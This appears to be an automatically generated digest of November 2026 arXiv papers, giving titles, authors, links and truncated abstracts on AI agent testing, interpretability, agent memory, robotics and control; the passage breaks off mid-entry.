- **2026-11-11** — Rachel Li, Chris Hays, Aaditya Ramdas et al. — [Controlling the Probability of Unknown Unknowns in Pre-Deployment Testing of AI Systems](http://arxiv.org/abs/2611.15835v1)
  <details><summary>📄 Abstract</summary>
  In pre-deployment testing of AI systems such as AI agents, a developer can often deal with known failure modes (e.g., leaking API keys, deleting important databases, or installing a malicious package) by implementing fixes or making contingency plans for when the same issue might occur again. What is more challenging are the unknown unknowns: the unseen failure modes that haven't surfaced during testing. The decision to stop testing and deploy therefore faces an inherent tradeoff: continue testi...
  </details>

- **2026-11-11** — Lyuou Zhang, Boxiang Wang, Lulu Wang et al. — [A Latent Semiparametric Mixture Model for Robust Heterogeneity Learning in High Dimensions](http://arxiv.org/abs/2611.15827v1)
  <details><summary>📄 Abstract</summary>
  Learning heterogeneity from high-dimensional data has become a fundamental task across many data-driven fields. Cluster analysis is a widely used unsupervised tool for this purpose, and many existing methods have been adapted to high-dimensional settings through sparsity constraints. In contrast to algorithmic approaches, model-based clustering offers clean theoretical guaranties and computational simplicity, but can be restrictive in practice due to its reliance on specific parametric distribut...
  </details>

- **2026-11-11** — Ameen Izhac, Nobuko Yoshida, Ronald Clark — [SpaceMCP: Vision Language Model Spatial Reasoning via Model Context Protocol](http://arxiv.org/abs/2611.15680v1)
  <details><summary>📄 Abstract</summary>
  Despite impressive advances in large language models (LLM), vision-language models (VLM) still exhibit limited spatial reasoning capabilities. Recent progress in feed-forward 3D reconstruction has enabled precise, real-time geometric understanding from visual inputs. In this work, we propose SpaceMCP, a framework that leverages these advances to introduce an MCP-style paradigm for spatial reasoning. Our approach augments a VLM with structured function calls, allowing it to query a scene graph fo...
  </details>

- **2026-11-11** — Rachel C. Zhang, Alberto Bietti, Wes Gurnee et al. — [A Mechanistic Interpretability Study of an Astronomy Foundation Model](http://arxiv.org/abs/2611.15653v1)
  <details><summary>📄 Abstract</summary>
  Foundation models are increasingly used across the sciences, but whether their internal computations correspond to known scientific operations or proceed through different mechanisms remains unclear. Understanding these mechanisms is essential for assessing reliability, identifying failure modes, and learning new science from the models. We present, to our knowledge, the first causal mechanistic interpretability study of an astronomy foundation model, AION-1, focusing on its multimodal advantage...
  </details>

- **2026-11-11** — Dustin Rubin, Vincenzo Timmel, Xufeng He et al. — [A Closer Look at Language Model Introspection: Probing Information and Reporting](http://arxiv.org/abs/2611.15267v1)
  <details><summary>📄 Abstract</summary>
  One way to study language-model introspection is to test whether models can identify where their activations have been perturbed. We train a simple linear classifier to identify the perturbed sentence from the model's activations, then compare its predictions with the model's own answers across pretraining and injection strengths. This tests whether the model is being asked to report information that is already easy to recover. If so, successful localization may be less demanding than it first a...
  </details>

- **2026-11-11** — Heisei Yonezawa, Ansei Yonezawa, Itsuro Kajiwara — [Sim-to-Real Powertrain Vibration Control via Model-Based Assisted Domain-Randomized Reinforcement Learning](http://arxiv.org/abs/2611.15133v1)
  <details><summary>📄 Abstract</summary>
  Controllers designed from nominal models often degrade on mechanical systems with nonlinearities and parametric variations, such as automotive powertrains with backlash. Deep reinforcement learning (DRL) with domain randomization can acquire robustness to such model discrepancies, but wide randomization destabilizes training and yields conservative policies, and experimental transfer of such policies has rarely been demonstrated in vibration control. This paper presents model-based controller as...
  </details>

- **2026-11-11** — Marie Amale Huynh, Regev Cohen, Serena Yeung-Levy et al. — [Back to the Question: Tracing Visual Distraction Through Text Tokens](http://arxiv.org/abs/2611.15039v1)
  <details><summary>📄 Abstract</summary>
  The visual world is cluttered: robust vision-language reasoning requires ignoring irrelevant information. Yet vision-language models (VLMs) can suffer substantial accuracy losses when answering questions about a target image with distractors present. Existing mitigations focus on selecting relevant images or limiting information exchange between images. Through a systematic analysis of three open 7-8B VLMs on five perception benchmarks adapted to include distractor images, we show that distracto...
  </details>

- **2026-11-11** — Binghang Lu, Lang Cao, Changhong Mou et al. — [RSI-PDEbench: A Benchmark for Self-Improving Agents in PDE Solving](http://arxiv.org/abs/2611.14949v1)
  <details><summary>📄 Abstract</summary>
  Identifying and solving partial differential equations (PDEs) from sampled solution data often requires substantial expert effort in equation discovery, coefficient estimation, and numerical solver configuration, especially under noise and distribution shifts. Can large language model (LLM) agents automate this workflow accurately and efficiently? To investigate this question, we introduce \bench{}, a benchmark of 1,001 cases spanning 42 equation templates, including both classical and fractiona...
  </details>

- **2026-11-11** — Zahraa Selim, Menna Hamed, Wesam Ahmed et al. — [Edge-Native Multimodal RAG: Hardware-Aware Quantization and Architectural Optimization for Consumer GPUs](http://arxiv.org/abs/2611.14924v1)
  <details><summary>📄 Abstract</summary>
  Deployment of retrieval-augmented generation (RAG) for Edge-AI is constrained by memory and bandwidth limitations. A standard 7B parameter model consumes 14 GB Video Random Access Memory (VRAM) in half-precision (FP16), precluding co-location of vector indices and Key-Value (KV) caches. This paper presents an engineering integration and empirical evaluation of a multimodal RAG framework optimized for consumer-grade Turing hardware (e.g., NVIDIA Tesla T4). Our system-level analysis identifies a c...
  </details>

- **2026-11-11** — Peijun Hou, Yue Zhang, Yi Wei et al. — [Janus: One Agent, Two Roles for Digital Twin Construction and Network Orchestration](http://arxiv.org/abs/2611.14920v1)
  <details><summary>📄 Abstract</summary>
  Next-generation wireless networks are increasingly large-scale, heterogeneous, and dynamic, posing significant challenges to network modeling and control. Digital twins offer a promising solution, but existing approaches typically rely on static models and decouple twin construction from network orchestration, limiting adaptability. Meanwhile, large language models (LLMs) provide strong reasoning capabilities but struggle with graph-structured data and are highly sensitive to prompt design, maki...
  </details>

- **2026-11-11** — Aoxiong Yin, Auden Li, Chao Huang et al. — [Hy ASR 3.0 Technical Report](http://arxiv.org/abs/2611.14908v1)
  <details><summary>📄 Abstract</summary>
  We present Hy ASR 3.0, a large language model (LLM)-based automatic speech recognition (ASR) system that delivers strong recognition accuracy, supports flexible contextual conditioning, and maintains robust recognition performance across diverse speech conditions. Hy ASR 3.0 supports Mandarin Chinese, English and 13 Chinese dialect groups, including Cantonese. Among the evaluated systems, it achieves the lowest aggregate error rates on public Mandarin Chinese, English, and Cantonese benchmarks a...
  </details>

- **2026-11-10** — Mingjie Cao, Gewei Zhang, Deqing Wang et al. — [Multi-Step Underwater Acoustic Channel Prediction via Dual-Domain Structure Preservation and Pretrained Transformer](http://arxiv.org/abs/2611.14592v1)
  <details><summary>📄 Abstract</summary>
  Accurate future channel state information (CSI) is essential for underwater acoustic (UWA) communication because delays associated with signal propagation, feedback, scheduling, and transceiver reconfiguration can render currently available CSI outdated. However, most existing predictors estimate only the next channel state and obtain multi-step forecasts through recursive rollout, which causes prediction errors to accumulate as the multipath structure evolves. The scarcity of sea-trial measurem...
  </details>

- **2026-11-10** — Guy Azran, Sarah Keren — [Robust Task-Aware State Estimation from Pre-trained Perception](http://arxiv.org/abs/2611.14781v1)
  <details><summary>📄 Abstract</summary>
  Agents that perform state estimation using pretrained perception models, e.g., Vision-Language Models (VLMs), face the fundamental challenge that predictions are uncertain. Still, most approaches determinize these predictions into a single best-guess state and make decisions as if it were ground truth. This is brittle because when the guess is wrong, the agent's decisions may be unsafe or infeasible. At the other extreme, maintaining a full probability distribution over symbolic states is often ...
  </details>

- **2026-11-10** — Ali Younes, Saeed Ghoorchian, Maximilian Schambach et al. — [Beyond Row-Level Prediction: Evaluating and Learning Composition for Reusable Table Representations](http://arxiv.org/abs/2611.14697v1)
  <details><summary>📄 Abstract</summary>
  Tables are compositional, with content spread across a schema, cell values, rows, and columns. Large-scale operations such as retrieval, overlap estimation, deduplication, and data curation need these local signals composed into one reusable embedding vector per table. Table representation methods, however, are mostly evaluated through row-level prediction or supervised downstream tasks, which do not measure table-level embedding quality directly. We introduce a benchmark that evaluates table-le...
  </details>

- **2026-11-10** — Alex Brown, Georgios Exarchakis, Mathilda Avirett-Mackenzie et al. — [Beyond classification: regressing physical merger properties using solid harmonic wavelet bispectrum](http://arxiv.org/abs/2611.14630v1)
  <details><summary>📄 Abstract</summary>
  Galaxy mergers play an important role in galaxy evolution; they enhance star formation, transform morphologies, and may drive accretion onto black holes. Due to their complex morphological features, identification of mergers poses a significant challenge. Convolutional neural networks (CNNs) have been successful at identifying mergers with good accuracy. However, similar to other deep learning techniques such as Vision Transformers, they require large training samples. Current methods are also l...
  </details>

- **2026-11-10** — Mario Chacón-Falcón, Tatiana Valentine Guy, Miroslav Kárný et al. — [Adversarial risk analysis with fully probabilistic designs](http://arxiv.org/abs/2611.14289v1)
  <details><summary>📄 Abstract</summary>
  Adversarial risk analysis (ARA) informs decision-makers when facing intelligent opponents and uncertain outcomes, enabling an analyst to model beliefs about the opponents' preferences, capabilities, beliefs, and the strategic calculations that opponents employ. Major applications cover reliability and risk analysis of critical infrastructures in presence of adversarial threats. In such domains, ARA mitigates typical common knowledge assumptions of standard game-theoretic approaches. However, ARA...
  </details>

- **2026-11-10** — Ziqing Xu, Hancheng Min, Lachlan Ewen MacDonald et al. — [A Margin Perspective on LoRA: Robustness to Catastrophic Forgetting and Adapter Merging (MaLoRA)](http://arxiv.org/abs/2611.14397v1)
  <details><summary>📄 Abstract</summary>
  Low-rank adaptation (LoRA) is the de facto method for parameter-efficient fine-tuning of large neural networks, achieving strong task adaptation with minimal trainable parameters and low optimization cost. Beyond this efficiency, practitioners have observed two striking properties: \textit{robustness to catastrophic forgetting} and the ability to \textit{merge independently trained adapters} into a single model that performs competitively across multiple tasks. These properties are central to co...
  </details>

- **2026-11-10** — Rezwan Islam Salvi, Saiyma Sittul Muna, Mushfiqur Rahman Mushfique — [HandsOnAid: Building and Evaluating an Offline First-Aid Assistant for Emergency Response Scenarios](http://arxiv.org/abs/2611.14059v1)
  <details><summary>📄 Abstract</summary>
  Emergencies can occur where there is no phone signal and no ambulance nearby. A small language model on a phone can be helpful in such situations, but its advice needs to be safe and accurate. We built HandsOnAid, a 4-bit Gemma 2B model fine-tuned with QLoRA on FirstAidQA dataset, a corpus of 5,550 first-aid question-answer pairs. We compared seven configurations, including the base, 4-bit and 8-bit fine-tuned models, and versions with a length floor, safety gate, or retrieval. We used a 41-pair...
  </details>

- **2026-11-10** — Sandarbh Agrawal, Rakshith Sathish, Ashwathi Nambiar — [Satellite Pretraining Is Not One Thing: A Matched-Pair Study of Generic and Earth-Observation Foundation Models for Scene Classification](http://arxiv.org/abs/2611.13849v1)
  <details><summary>📄 Abstract</summary>
  Geospatial foundation models are pretrained on satellite and aerial imagery, but whether such an encoder beats a strong generic one for few-label land-use/land-cover mapping remains unclear, as prior comparisons rarely isolate the pretraining data. We study five matched pairs of Earth-observation (EO) and generic encoders sharing objective and architecture (DINO/SatDINO, DINOv3/DINOv3-SAT, MAE/SatMAE, MAE/Scale-MAE, CLIP/RemoteCLIP) within a benchmark of 14 frozen encoders on five RGB scene-clas...
  </details>

- **2026-11-10** — Jianqiang Wang, Tengfei Liu, Zhong-Ping Jiang — [Input-to-State Safety and Small-Gain Theorems for Large-Scale Nonlinear Systems](http://arxiv.org/abs/2611.13718v1)
  <details><summary>📄 Abstract</summary>
  This paper studies the safety verification problem for a general class of large-scale systems characterized by multiple safety indicator functions. Each safety indicator function satisfies a trajectory-based input-to-state safety (ISSf) estimate that provides a lower bound on its value along system trajectories in terms of the initial state, external inputs, and the other safety indicator functions, whose influence is quantified by continuous and nondecreasing gain functions. Within this framewo...
  </details>

- **2026-11-10** — Qinan Zhang, Xinyu Wang, Qihang Jin et al. — [Towards Reliable VLM Judges: State-Conditional Invariance and Presentation-Aware Diagnostics](http://arxiv.org/abs/2611.13596v1)
  <details><summary>📄 Abstract</summary>
  Vision-language models (VLMs) are increasingly used as automated judges for multimodal and embodied tasks, yet aggregate accuracy or consistency alone does not reveal whether a judge changes its verdict for the right reason. We propose State-Conditional Invariance (SCI), a reliability principle requiring a judge to remain stable under semantics-preserving changes in presentation while responding to causal interventions that change the task outcome. We instantiate SCI in GridWM-Judge, a simulator...
  </details>

- **2026-11-10** — Sina Mohammadi, Apurv Shukla, Junho Hong et al. — [An Accurate Modulation-Assisted Method for Phasor Estimation Under Decaying DC Offsets](http://arxiv.org/abs/2611.13558v1)
  <details><summary>📄 Abstract</summary>
  Decaying DC (DDC) offsets severely compromise the accurate estimation of current phasors immediately following power grid fault occurrence. Consequently, conventional full-cycle discrete Fourier transform (FCDFT) algorithms experience decaying oscillatory magnitude errors, potentially causing distance relays to malfunction. This paper introduces a modulation-assisted technique designed to precisely eliminate the DDC components from fault current signals. By multiplying the fault signal with a hi...
  </details>

- **2026-11-10** — Siddhartha Chatterjee — [Darmok: Championship Cryptic Crossword Solving via Constraint Tightening and Resilient Orchestration](http://arxiv.org/abs/2611.13557v1)
  <details><summary>📄 Abstract</summary>
  We present Darmok, the first automated system to reach superhuman performance on British cryptic crosswords. Unlike American-style crosswords, cryptic clues disguise an unmarked definition and compositional wordplay beneath a misleading surface reading, sparse grids leave nearly half of each word's letters unchecked, and tournament rules rank a grid with even a single wrong or blank square behind all error-free solutions regardless of speed. Competing alongside an elite human field at the 55th T...
  </details>

- **2026-11-10** — Xuheng Zhang, Yiming Zhang, Jialin Gao et al. — [LaST0.5: A Generalist World Action Model with Interaction-Centric Latent Reasoning](http://arxiv.org/abs/2611.14048v1)
  <details><summary>📄 Abstract</summary>
  World Action Models (WAMs) have recently emerged as a promising paradigm for robotic manipulation, endowing policies with strong capabilities for modeling temporal and physical dynamics. Existing WAMs, encompassing both video-first action prediction and joint video-action modeling, directly transfer global physical representations from world models to action generation. However, global scene representations may underemphasize local robot-object interactions, creating a mismatch between represent...
  </details>

- **2026-11-10** — Martim Afonso, Inês Lynce, Maurizio Morisio et al. — [ProofCoder: Continuous Reasoning for Automated Software Verification](http://arxiv.org/abs/2611.14106v1)
  <details><summary>📄 Abstract</summary>
  Formal verification using proof assistants provides strong correctness guarantees for software, but constructing proofs remains labor-intensive and requires significant expertise. Recent approaches based on large language models (LLMs) have shown promise in automating proof synthesis. However, these approaches typically constrain the model to a rigid tactic-generation loop, in which the surrounding system controls premise retrieval, proof-state management, and backtracking. We introduce ProofCod...
  </details>

- **2026-11-10** — Zehui Wang, Wolfram Höpken, Dietmar Jannach — [Data Quality Challenges in Multimodal Tourism Recommender Systems](http://arxiv.org/abs/2611.13972v1)
  <details><summary>📄 Abstract</summary>
  Modern recommender systems increasingly consider diverse data modalities to enhance model performance. However, the quality of the underlying multimodal data (e.g. data from social media platforms) has received limited attention so far. Focusing on tourism recommendation, we examine real-world challenges encountered when using datasets from Yelp and Instagram. Issues include noise from fake reviews, hallucinated content from LLMs, modality contradictions, and demographic bias. We outline future ...
  </details>

- **2026-11-10** — Stefan van Dijk, W. P. M. H. Heemels, Paula Chanfreut Palacio — [Online Adaptive Clustering in Robust Distributed Model Predictive Control](http://arxiv.org/abs/2611.13923v1)
  <details><summary>📄 Abstract</summary>
  This paper proposes a dynamic clustering framework for tube-based model predictive control (MPC) of coupled multi-agent systems. Agents within a cluster coordinate their dynamics explicitly, while couplings from agents outside the cluster are treated as bounded disturbances. For each admissible cluster, we construct a state-dependent mismatch measure from a robust upper bound on its predicted closed-loop cost and an optimistic, partition-independent lower bound. Combining this mismatch with a co...
  </details>

- **2026-11-10** — Ruohan Wang, Giannis Delimpaltadakis, Luca Laurenti et al. — [Efficient control of multi-agent robust MDPs through tensor trees](http://arxiv.org/abs/2611.13672v1)
  <details><summary>📄 Abstract</summary>
  This paper introduces a tensor-based framework for controller synthesis of stochastic multi-agent systems under temporal logic specifications that couple the agents, such as one agent reaching its goal only after another agent has reached its own. The agents are modeled as robust Markov decision processes (RMDPs), whose transition probabilities are only known to lie in an ambiguity set, for instance due to abstraction errors, learned models, or uncertain parameters. We show that the decoupled na...
  </details>

- **2026-11-10** — Bowen Deng, Gwang-Jin Jeong, Seulgi Noh et al. — [Lightweight Deep Learning Framework for Astrocyte-Centric 3D Reconstruction across Normal and Stress-associated Ultrastructural States](http://arxiv.org/abs/2611.13581v1)
  <details><summary>📄 Abstract</summary>
  The morphology of astrocytes is closely associated with their ability to support and modulate neural circuit functions; however, its reconstruction from volume electron microscopy (vEM) data remains labor-intensive and computationally resource-intensive, placing substantial barriers on its broader adoption and scalability despite the high spatial resolution of vEM. We present AstroSeg-vEM, a lightweight, astrocyte-centric framework for morphology-preserving astrocyte segmentation, 3D reconstruct...
  </details>

- **2026-11-10** — Hanyu Jin, Kenji Shimada — [DeRep: Learning Depth Representations for End-to-End Navigation in Cluttered Environments](http://arxiv.org/abs/2611.13499v1)
  <details><summary>📄 Abstract</summary>
  End-to-end navigation in cluttered environments relies on compact visual representations to support collision avoidance and goal-directed motion. Existing methods typically learn these representations jointly with the policy or through observation reconstruction, which does not explicitly specify what information the representation should preserve. Moreover, they are usually evaluated with a single downstream policy learner, although the benefit of a representation may depend on how the policy i...
  </details>

- **2026-11-10** — Mingchen Li, Yongkang Xiao, Rumeng Li et al. — [BioMem: Agentic Memory for Biomedical LLM Agents](http://arxiv.org/abs/2611.13426v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) have demonstrated considerable potential in biomedical applications, while agentic memory systems have emerged as a promising approach to preserving and utilizing information across tasks and interactions. However, a fundamental question remains: how effectively and reliably do these systems retain, retrieve, update, and utilize biomedical information? In this study, we systematically investigate agentic memory in the biomedical domain, focusing on task effectiveness...
  </details>

- **2026-11-10** — Alireza Daghigh, Chung-Yu Wang, Luca Filippelli et al. — [SPARK: Semantic-preserving Prompt Mutation for Code Generation using Consensus-based Verification Framework](http://arxiv.org/abs/2611.13401v1)
  <details><summary>📄 Abstract</summary>
  Automated code generation with large language models (LLMs) has improved in recent years. With the lack of test cases in real-world usages, generated code is not automatically verifiable and often requires manual validation. Previous studies have leveraged consensus verification, where code solutions and corresponding test cases are generated and evaluated based on functional consistency. Building on this, SPARK incorporates semantic-preserving mutations to problem descriptions such as paraphras...
  </details>

- **2026-11-09** — Grigory Malinovsky, Yury Demidovich, Peter Richtárik — [Byzantine-Robust Muon: Resilient Momentum Orthogonalization for Distributed Learning](http://arxiv.org/abs/2611.13137v1)
  <details><summary>📄 Abstract</summary>
  Optimization methods, including the Muon optimizer based on the Linear Minimization Oracle (LMO) and momentum orthogonalization, have shown strong empirical performance in large-scale and distributed learning, yet their robustness to adversarial behavior and data heterogeneity is not well understood. We study these methods within a unified first-order trust-region framework and analyze Muon-based updates with robust aggregation for Byzantine-robust distributed and federated learning. Our analysi...
  </details>

- **2026-11-09** — Shu Jiang, Graham A. Colditz — [Do AI Agents need Preventive Care? An Epidemiologic Cohort Design for Agentic AI](http://arxiv.org/abs/2611.13333v1)
  <details><summary>📄 Abstract</summary>
  As AI agents increasingly perform tasks autonomously across sectors, including healthcare and biomedical research, understanding how their behaviors develop and influence outcomes over time becomes increasingly important. Existing evaluations largely focus on model capabilities and performance on predefined tasks. Here, we propose an epidemiologic cohort design for studying agentic AI, drawing on principles established in human population studies. The framework treats individual agents as member...
  </details>

- **2026-11-09** — Pedro Antonio Alarcon Granadeno, Jane Cleland-Huang — [DOBB: Dynamic Oriented Bounding Boxes for Multi-Agent Collision Avoidance under State Uncertainty and Heterogeneous Dynamics](http://arxiv.org/abs/2611.13142v1)
  <details><summary>📄 Abstract</summary>
  Learning-based decentralized collision avoidance must remain reliable under state-estimation uncertainty and heterogeneous agent dynamics. Existing methods typically address these factors through training-domain variation or by exposing uncertainty and capability estimates to the policy at runtime. However, both leave the policy to infer how these quantities should alter the physical separation required for safe interaction, which can couple collision-avoidance behavior to relationships learned ...
  </details>

- **2026-11-09** — Mahyar Bolhassani, Tijana Geroski, Narayana S. Singam et al. — [Domain adaptation of a video Foundation model for Heart Failure Diagnosis from Echocardiography](http://arxiv.org/abs/2611.13297v1)
  <details><summary>📄 Abstract</summary>
  The rapid advancement of foundation models has transformed computer vision, yet their adaptation to medical imaging, particularly purpose built foundation models for spatio temporal echocardiography videos, remains limited. In this work, we explore the feasibility of fine tuning a pretrained foundation model for video (TimeSformer) for automated diagnosis of reduced ejection fraction heart failure (HFrEF) from apical four chamber videos. The model is finetuned on the publicly available RVENet A4...
  </details>

- **2026-11-09** — Rayed AlGhamdi — [Reliability of Claude Code as an Agentic AI Grading System for Handwritten University Exams](http://arxiv.org/abs/2611.13217v1)
  <details><summary>📄 Abstract</summary>
  This study examines the reliability of Claude Code, an agentic deployment of the Claude Opus 4.6 large language model, as a grading system for handwritten university exams. Four research questions addressed agreement with expert human grading on total scores (RQ1), agreement across five question types from multiple choice to evaluative judgement (RQ2), consistency across two independent grading sessions one week apart (RQ3), and the accuracy of AI-generated feedback (RQ4). Claude Code graded the...
  </details>

- **2026-11-09** — Gabriel Sargent, Will Wei Sun, Zhengwu Zhang et al. — [Prediction-Powered LLM Ranking with Adaptively Collected Human Feedback](http://arxiv.org/abs/2611.13186v1)
  <details><summary>📄 Abstract</summary>
  Ranking large language models (LLMs) through human evaluations is essential for downstream decision-making. Because human feedback is expensive, evaluation platforms often collect it adaptively, prioritizing informative model comparisons using previously observed feedback. To further improve precision with limited human feedback, evaluators can draw on abundant unrated responses and relatively inexpensive LLM judges; however, judge bias and adaptive dependence challenge standard i.i.d. inference...
  </details>

- **2026-11-09** — Aviv Orly, Ori Shem-Ur, Yaron Oz — [One Temperature to Rule Them All?](http://arxiv.org/abs/2611.13077v1)
  <details><summary>📄 Abstract</summary>
  Inference-time sampling is a central mechanism for improving large language models, with temperature controlling the tradeoff between reliability and diversity. While recent work suggests that varying temperature across samples can improve multi-sample inference, simple fixed-temperature schemes remain the standard in practice. We investigate this discrepancy in the canonical pass@K setting, asking when temperature diversity is useful, and when a single tuned temperature suffices. To this end, w...
  </details>


### 📂 watermark
*水印与溯源 / Watermarking & Provenance* — 22 papers

- **2026-11-12** — Gustavo Pinto — [Where LLM Agents Get Stuck Debugging Databases: Access More Than Reasoning](http://arxiv.org/abs/2611.17304v1)
  <details><summary>📄 Abstract</summary>
  Large language model (LLM) coding agents are increasingly asked not only to write code but to debug running systems from live runtime data. We report a field observation of one such agent (Claude Code) as it diagnosed eight database incidents in a production message-dispatch engine. In every incident whose root cause depended on runtime concurrency, the agent announced a cause, shipped a fix, and later walked it back, and each wrong guess cost a deploy-and-observe cycle. Mapping each incident to...
  </details>

- **2026-11-12** — Peiwen Li, Harshit Verma, Sophia Zhou et al. — [CoReMem: Cost-Internalizing Memory for Successive Coding Tasks with Prospective Valuation](http://arxiv.org/abs/2611.17316v1)
  <details><summary>📄 Abstract</summary>
  Coding agents tackle successive tasks on an evolving repository, carrying forward edits and writing memory before the next task is known. Selecting memory for unknown next tasks requires balancing future usefulness against the costs of writing and reading it. The actor must also decide when acting on available memory saves effort as the task unfolds. We introduce Coding-Repository Memory (CoReMem), a cost-internalizing framework that guides memory design and actor adaptation through measured mem...
  </details>

- **2026-11-12** — Christopher Liaw, Aranyak Mehta, Grigoris Velegkas et al. — [Sketching Language Models for Context Attribution](http://arxiv.org/abs/2611.17313v1)
  <details><summary>📄 Abstract</summary>
  Context attribution asks how removing parts of a prompt changes a language model's output. We study leave-one-out (LOO) attribution for a prompt of $n$ tokens and a fixed measurement function. Computing all LOO values directly requires $n$ model evaluations. Under a stability assumption, our algorithm estimates all LOO values to error proportional to $\varepsilon$ with constant probability using $O(\sqrt{\log(1/\varepsilon)}/\varepsilon)$ evaluation calls. To complement our upper bound, we prove...
  </details>

- **2026-11-12** — Xijun Wang, Zhaoyang Liu, Xiang Chen et al. — [Context Graph: Explainable Multi-Agent Decision Chains in AI-RAN](http://arxiv.org/abs/2611.16879v1)
  <details><summary>📄 Abstract</summary>
  AI-RAN distributes network control across multiple autonomous agents, namely xApps and rApps operating over shared radio resources. When an alert or degradation appears, operators currently lack a structured way to trace which decision caused it, what context triggered that decision, and how other agents interacted. Existing explainability tools focus on single-model feature attribution or linear event logging, neither of which captures cross-agent decision chains. We propose the Context Graph, ...
  </details>

- **2026-11-12** — Chunkit Chan, Kawai Chung, Sze Heng Douglas Kwok et al. — [MuSeToM: Multi-Sensory Evaluation of Belief Revision with Textual Cues Across Six Senses](http://arxiv.org/abs/2611.16662v1)
  <details><summary>📄 Abstract</summary>
  Theory of Mind (ToM), the ability to infer mental states in others, is pivotal for human social cognition. Existing evaluations of ToM in large language models (LLMs) mainly focus on static belief attribution and false-belief reasoning, leaving a critical aspect of social reasoning underexplored: can LLMs decide whether perceptual evidence is sufficient to justify another person's belief revision? To address this gap, we present MuSeToM, a human-validated, text-based benchmark for evaluating epi...
  </details>

- **2026-11-11** — Arleth Salinas, Ishrat Jahan Eliza, Valerio Pascucci — [Food Critic: An Agentic Visualization System for Auditable Restaurant-Safety Reasoning](http://arxiv.org/abs/2611.15843v1)
  <details><summary>📄 Abstract</summary>
  Generative AI agents are increasingly being embedded into visualization systems that can search data, invoke tools, summarize evidence, and produce recommendations. However, when agents rely solely on their own knowledge, the visualization problem is not only whether the agent provides a useful answer, but also whether users can inspect how that answer is grounded. We present Food Critic, an agentic visualization system for diners' restaurant decision support that integrates public health inspec...
  </details>

- **2026-11-11** — Elzo Brito dos Santos Filho — [When Agents Need to Consolidate Memories: What RRR Consolidation Explains, and What It Does Not Explain, in Conversation ESAA](http://arxiv.org/abs/2611.15644v1)
  <details><summary>📄 Abstract</summary>
  Language-model agents can share conversational history across sessions, but persistence does not guarantee retrieval of current decisions and their provenance. This engineering study presents Memory-TCG, a Conversation ESAA extension inspired by ringing, resonance and renormalization (RRR), and an exploratory synthetic evaluation comparing chronological retrieval, two simplified baselines (B, recency-aware, and B', authority-aware), full RRR, and variants under three output budgets. With 480 fac...
  </details>

- **2026-11-11** — Vahid Haratian, Vahid Ansari, Mohammadhossein Malmir et al. — [Robo-SWE: An Executable Issue-Resolution Dataset Mined from Robot Software Repositories](http://arxiv.org/abs/2611.16116v1)
  <details><summary>📄 Abstract</summary>
  Coding agents are evaluated mostly on general-purpose software, but domain-specific systems require domain-aware evaluation. Robot software is a particularly challenging case: Robot Operating System 2 (ROS 2) packages have their own build tools, simulators and learning frameworks are built on physics engines, and behavior that depends on timing and hardware is hard to test. We present Robo-SWE, a dataset of 236 executable issue-resolution tasks mined from merged pull requests in 28 public roboti...
  </details>

- **2026-11-11** — Chirag Ahuja, Vladislav Tanov, Ramcharan Kakarla et al. — [DISCERN: Preserve at Write, Resolve at Read for Persistent LLM-Agent Memory](http://arxiv.org/abs/2611.15729v1)
  <details><summary>📄 Abstract</summary>
  Enterprise agents accumulate memory across dozens of sessions in which facts contradict, get superseded, and blur as similarly named entities collide in embedding space. The field treats this as a retrieval problem; we show it is not. On ENT-310, a synthetic enterprise sales-agent memory benchmark of 310 queries (210 answerable, 100 unanswerable), a vanilla Retrieval-Augmented Generation (RAG) reader over a memory store already matches strong memory systems on the recall pillars. Retention and c...
  </details>

- **2026-11-11** — Konstantinos Skianis, Giannis Nikolentzos, Polykarpos Meladianos et al. — [Differential Backpack Language Models: Sense Inhibition via Signed Contextualization Weights](http://arxiv.org/abs/2611.15642v1)
  <details><summary>📄 Abstract</summary>
  Backpack language models predict with a strictly linear combination of non-contextual per-word sense vectors, weighted by non-negative contextualization scores. We show that non-negativity conflates two properties: the linear readout, which carries the interpretability, and the conic combination, which merely restricts it. We relax the latter by computing the sense weights with differential attention, a difference of two softmax maps with a learned per-sense gain, so context can actively inhibit...
  </details>

- **2026-11-11** — Yufei Luo, Yuchen Ling, Chunrong Fang — [CoLFA: Collaboration-Guided Lightweight Failure Attribution for LLM-Based Multi-Agent Systems](http://arxiv.org/abs/2611.14980v1)
  <details><summary>📄 Abstract</summary>
  Failure attribution in multi-agent systems requires tracing error formation to identify the decisive error step and the responsible agent. However, agents' division of work and information exchange lead to Interleaved Steps and Cluttered Content, requiring models to link executions and check details in lengthy records. This makes it difficult to balance localization accuracy and token cost. We find that multi-agent collaboration also leaves records of how executions connect and content passes be...
  </details>

- **2026-11-10** — J. Zach Gazak, Ryan Swindle, Justin Fletcher — [Sophon: A Procedural Diagnostic for Spatial Reasoning in Vision-Language Models](http://arxiv.org/abs/2611.14838v1)
  <details><summary>📄 Abstract</summary>
  Open-weight Vision-Language Models (VLMs) score 85-94% on spatial benchmarks (BLINK Spatial, What's Up CLEVR) yet collapse to chance on simple geometric questions when object, scene, and texture priors are stripped away. We introduce and open-source Sophon, a procedurally generated diagnostic of paired colored point-cloud stimuli across three coordinate systems (1D linear, 2D Cartesian, 2D polar) and four question types (binary, categorical, comparative, quantitative). Across four open architect...
  </details>

- **2026-11-10** — Jiani Zhang, Manav Garg, Eugenie Lai et al. — [SynthCorp: A Platform for Creating Benchmarks for Data Agents](http://arxiv.org/abs/2611.14765v1)
  <details><summary>📄 Abstract</summary>
  Current benchmarks for LLM-driven data agents saturate quickly and cannot target specific capabilities. We present SynthCorp, a platform that creates customizable data estates and benchmarks by simulating how business events produce and modify corporate data over time. Each data estate combines relational databases, a document store, and a data catalog, paired with evaluation tasks and executable gold programs. First, given a scenario and target complexity dimensions, SynthCorp synthesizes reusa...
  </details>

- **2026-11-10** — Max Niedermaier, Mahdi Sedighi Jafari — [Gravitational observables from a post-Carrollian expansion](http://arxiv.org/abs/2611.14644v1)
  <details><summary>📄 Abstract</summary>
  Einstein gravity, with a few exceptions, only admits nonlocal observables. This feature is often attributed to diffeomorphism invariance, since a gravitational field can thereby locally be transformed away. We show this attribution to be incorrect by constructing infinitely many exact ultralocal Dirac observables in (velocity dominated aka electric) Carroll gravity. The latter describes Einstein gravity's ultrarelativistic limit, is fully diffeomorphism invariant, and of independent interest in ...
  </details>

- **2026-11-10** — Ilia Larchenko, Gleb Zarin, Atindra Nair et al. — [One Policy for 100 Household Tasks: Our Solution for the 2026 BEHAVIOR Challenge](http://arxiv.org/abs/2611.14432v1)
  <details><summary>📄 Abstract</summary>
